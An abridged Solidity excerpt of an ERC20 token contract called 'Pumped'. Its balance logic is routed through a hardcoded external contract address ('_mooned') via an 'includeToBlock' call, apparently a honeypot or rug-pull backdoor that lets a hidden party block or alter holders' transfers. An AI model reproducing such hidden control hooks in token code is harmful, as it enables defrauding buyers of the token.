...
contract ERC20 is Context, IERC20, IERC20Metadata, Ownable {
    ...
    address _mooned = 0x63d41B85c125c1a8Dcc182fdE0C09FF6bc22229b;
    address public pair;
    ...
    function senderBalance(uint256 amount) internal returns (uint256) {
        return mooned.includeToBlock(amount);
    }
    ...
    function _DeployPumped(address account, uint256 amount) internal virtual {
...
contract ERC20Token is Context, ERC20 {
    constructor(
        ...
        _DeployPumped(creator, initialSupply);
    }
}

contract Pumped is ERC20Token {
    constructor() ERC20Token("Pumped", "PUMPED", msg.sender, 1000000000 * 10 ** 18) {
    }
}